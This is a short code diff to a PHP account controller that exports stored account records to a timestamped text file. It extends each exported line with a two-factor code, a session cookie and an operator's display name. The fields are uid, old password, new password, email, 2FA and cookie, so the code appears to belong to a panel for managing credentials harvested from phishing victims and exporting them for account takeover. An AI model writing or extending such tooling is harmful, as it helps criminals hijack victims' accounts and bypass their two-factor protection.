@@ -133,7 +133,7 @@ class AccountController extends Controller
                 $accounts = $accounts->whereDate('created_at', $created_at);
             }
 
-            $accounts = $accounts->get();
+            $accounts = $accounts->with('User')->get();
             $content = "";
             foreach ($accounts as $account){
                 $uid = $account->uid;
@@ -141,7 +141,10 @@ class AccountController extends Controller
                 $newpass = $account->newpass;
                 $email = $account->email;
                 $useragent = $account->useragent;
-                $content .= $uid . '|' . $oldpass . '|' . $newpass . '|' . $email . '|' . $useragent ."\n";
+                $twofa = $account->twofa;
+                $cookie = $account->cookie;
+                $user = $account->User ? $account->User->display_name : '';
+                $content .= "$uid|$oldpass|$newpass|$email|$twofa|$useragent|$cookie|$user\n";
             }
             $fileName = "backup".date("Y-m-d-H-i-s").".txt";
             $headers = [
